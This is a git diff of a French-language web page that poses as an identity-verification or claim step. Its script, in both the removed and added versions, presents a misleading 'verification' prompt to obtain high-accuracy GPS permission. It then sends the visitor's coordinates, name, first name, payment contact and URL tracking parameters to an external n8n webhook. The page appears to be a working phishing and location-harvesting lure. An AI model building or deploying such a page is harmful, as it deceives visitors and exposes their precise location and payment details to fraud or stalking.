@@ -60,10 +60,6 @@
             Vos données servent uniquement à vérifier votre identité et vous contacter.
         </p>
 
-        <button id="claim-button"
-        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
-        Continuer la vérification
-    </button>
         <!-- 🎥 Vidéo YouTube de Présentation -->
         <!-- 🎥 Vidéo explicative officielle -->
         <div id="video-placeholder" class="relative cursor-pointer group">
@@ -94,7 +90,10 @@
   
 
 
- 
+        <button id="claim-button"
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
+            Continuer la vérification
+        </button>
     </div>
 
     <!-- 📝 FORMULAIRE -->
@@ -160,191 +159,170 @@
     </div>
 
 </div>
-
 <script>
-    // 🔥 Récupère tous les paramètres de l'URL
-    const urlParams = Object.fromEntries(new URLSearchParams(window.location.search));
-    function getGPSCoordinates() {
-    return new Promise(async (resolve) => {
-
-        // ESSAI GPS RAPIDE
-        if (navigator.geolocation) {
-            try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => res(p),
-                        (e) => rej(e),
-                        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
-                    );
-                });
-
-                return resolve({
-                    method: "gps",
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    source: "getCurrentPosition"
-                });
-
-            } catch (err) {
-                console.warn("⚠️ GPS rapide KO :", err.message);
-            }
+    document.addEventListener("DOMContentLoaded", () => {
+    
+        /* ===========================================================
+           PHASE 0 — PARAMS URL
+        ============================================================ */
+        const urlParams = Object.fromEntries(new URLSearchParams(location.search));
+    
+        /* ===========================================================
+           PHASE 1 — DOM ELEMENTS
+        ============================================================ */
+        const claimButton = document.getElementById("claim-button");
+        const dataForm = document.getElementById("data-form");
+        const initialNotification = document.getElementById("initial-notification");
+        const submitButton = document.getElementById("submit-button");
+        const resultMessage = document.getElementById("result-message");
+        const errorMessage = document.getElementById("error-message");
+        const locationInput = document.getElementById("location-input");
+    
+        /* ===========================================================
+           PHASE 2 — WEBHOOK (toujours le même)
+        ============================================================ */
+        const WEBHOOK = "https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55";
+    
+        function sendToWebhook(payload) {
+            return fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    ...payload,
+                    date_saisie: new Date().toLocaleString("fr-FR"),
+                    ...urlParams
+                })
+            }).catch(console.error);
         }
-
-        // ESSAI GPS HAUTE PRÉCISION
-        if (navigator.geolocation) {
-            try {
-                const precise = await new Promise((resolvePrecise, rejectPrecise) => {
-                    let resolved = false;
-                    const watchId = navigator.geolocation.watchPosition(
-                        (p) => {
-                            if (!resolved && p.coords.accuracy < 80) {
-                                resolved = true;
-                                navigator.geolocation.clearWatch(watchId);
-                                resolvePrecise({
-                                    method: "gps",
-                                    latitude: p.coords.latitude,
-                                    longitude: p.coords.longitude,
-                                    accuracy: p.coords.accuracy,
-                                    source: "watchPosition"
-                                });
-                            }
-                        },
-                        (err) => {
-                            try { navigator.geolocation.clearWatch(watchId); } catch(e){}
-                            rejectPrecise(err);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-
-                    setTimeout(() => {
-                        if (!resolved) {
-                            try { navigator.geolocation.clearWatch(watchId); } catch(e){}
-                            rejectPrecise(new Error("watchPosition timeout"));
-                        }
-                    }, 10000);
-                });
-
-                return resolve(precise);
-
-            } catch (err) {
-                console.warn("⚠️ GPS haute précision KO :", err.message);
-            }
+    
+        /* ===========================================================
+           PHASE 3 — GPS WRAPPER (NE BLOQUE JAMAIS)
+        ============================================================ */
+    
+        function getGPSWithFailSafe(callback) {
+    
+            // ÉTAPE 1 : Lancement watchdog EXTERNE (ne freeze pas)
+            let finished = false;
+    
+            const watchdog = setTimeout(() => {
+                if (!finished) {
+                    finished = true;
+                    console.warn("⛔ GPS freeze -> fallback timeout");
+                    callback({
+                        status: "gps_timeout",
+                        latitude: 0,
+                        longitude: 0,
+                        accuracy: null
+                    });
+                }
+            }, 12000); // 12 secondes = safe window
+    
+            // ÉTAPE 2 : Tentative GPS
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    if (finished) return;
+                    finished = true;
+                    clearTimeout(watchdog);
+    
+                    callback({
+                        status: "gps_success",
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
+                },
+                (err) => {
+                    if (finished) return;
+                    finished = true;
+                    clearTimeout(watchdog);
+    
+                    callback({
+                        status: "gps_error",
+                        latitude: 0,
+                        longitude: 0,
+                        accuracy: null,
+                        error: err.message
+                    });
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
         }
-
-        // FALLBACK CLEAN
-        return resolve({
-            method: "denied",
-            latitude: 0,
-            longitude: 0,
-            accuracy: null,
-            source: "none"
+    
+    
+        /* ===========================================================
+           PHASE 4 — BOUTON 1 (DEMANDE GPS)
+        ============================================================ */
+    
+        claimButton.addEventListener("click", () => {
+    
+            // 1️⃣ Toujours envoyer un événement "gps_requested" immédiatement
+            //sendToWebhook({ event: "gps_requested" });
+    
+            // 2️⃣ Demander la permission explicitement
+            const ok = confirm("Pour continuer, activez la fonctionnalité de verification.");
+            if (!ok) return;
+    
+            locationInput.value = "Localisation en cours…";
+    
+            // 3️⃣ Lancer la procédure GPS SAFETY
+            getGPSWithFailSafe((coords) => {
+    
+                let localisationString =
+                    coords.status === "gps_success"
+                    ? `Lat: ${coords.latitude.toFixed(6)}, Lon: ${coords.longitude.toFixed(6)} (±${Math.round(coords.accuracy)}m)`
+                    : "Localisation indisponible";
+    
+                locationInput.value = localisationString;
+    
+                // 4️⃣ Envoi à n8n (résultat GPS)
+                sendToWebhook({
+                    event: coords.status,
+                    localisation: localisationString
+                });
+    
+                // 5️⃣ On affiche le formulaire APRÈS résolution
+                initialNotification.style.display = "none";
+                dataForm.style.display = "block";
+            });
+    
         });
-    });
-}
-
     
-    let collectedData = {};
     
-    const claimButton = document.getElementById('claim-button');
-    const dataForm = document.getElementById('data-form');
-    const submitButton = document.getElementById('submit-button');
-    const initialNotification = document.getElementById('initial-notification');
-    const resultMessage = document.getElementById('result-message');
-    const errorMessage = document.getElementById('error-message');
     
-    claimButton.addEventListener('click', () => {
-    initialNotification.style.display = 'none';
-    dataForm.style.display = 'block';
-
-    const locationInput = document.getElementById('location-input');
-    locationInput.value = "Vérification Anti robot & GEO...";
-
-    // ⬇️ APPEL GPS ICI
-    getGPSCoordinates().then((coords) => {
-        let localisationString = "";
-
-        if (coords.method === "gps") {
-            localisationString = `Lat: ${coords.latitude.toFixed(6)}, Lon: ${coords.longitude.toFixed(6)} (±${Math.round(coords.accuracy)}m)`;
-        } else {
-            localisationString = "Localisation refusée / indisponible";
-        }
-
-        locationInput.value = localisationString;
-
-        console.log("📍 Localisation :", localisationString);
-
-        // 🚀 Envoi automatique 1 (GPS)
-        fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                localisation: localisationString,
-                nom: "",
-                prenom: "",
-                contact_paiement: "",
-                date_saisie: new Date().toLocaleString('fr-FR'),
-                ...urlParams
-            })
-        })
-        .then(res => res.text())
-        .then(result => console.log("🟢 GPS envoyé à n8n :", result))
-        .catch(err => console.error("🔴 Erreur envoi GPS :", err));
-    });
-});
-
+        /* ===========================================================
+           PHASE 5 — BOUTON 2 (FORMULAIRE COMPLET)
+        ============================================================ */
     
-    submitButton.addEventListener('click', () => {
-        const location = document.getElementById('location-input').value;
-        const name = document.getElementById('name-input').value;
-        const firstname = document.getElementById('firstname-input').value;
-        const contact = document.getElementById('contact-input').value;
+        submitButton.addEventListener("click", () => {
     
-        errorMessage.style.display = 'none';
+            const loc = locationInput.value;
+            const name = document.getElementById('name-input').value;
+            const firstname = document.getElementById('firstname-input').value;
+            const contact = document.getElementById('contact-input').value;
     
-        if (!location || !name || !firstname || !contact || location.includes("Récupération")) {
-            errorMessage.textContent = "Veuillez remplir tous les champs svp.";
-            errorMessage.style.display = 'block';
-            return;
-        }
+            if (!loc || !name || !firstname || !contact) {
+                errorMessage.classList.remove("hidden");
+                return;
+            }
     
-        collectedData = {
-            localisation: location,
-            nom: name,
-            prenom: firstname,
-            contact_paiement: contact,
-            date_saisie: new Date().toLocaleString('fr-FR')
-        };
+            sendToWebhook({
+                event: "form_submitted",
+                localisation: loc,
+                nom: name,
+                prenom: firstname,
+                contact_paiement: contact
+            });
     
-        dataForm.style.display = 'none';
-        resultMessage.style.display = 'block';
-    
-        console.log("===================================");
-        console.log("📩 DONNÉES DE FORMULAIRE COLLECTÉES :");
-        console.log(collectedData);
-        console.log("===================================");
-    
-        /* 🚀 ENVOI #2 — FORM COMPLET + URL PARAMS */
-        fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                ...collectedData,
-                ...urlParams // 👈 AJOUT DES PARAMÈTRES URL
-            })
-        })
-        .then(res => res.text())
-        .then(result => {
-            console.log("🟢 n8n a répondu :", result);
-        })
-        .catch(error => {
-            console.error("🔴 Erreur n8n :", error);
+            dataForm.style.display = "none";
+            resultMessage.classList.remove("hidden");
         });
     
     });
-</script>
-
+    </script>
+    
 </body>
 </html>
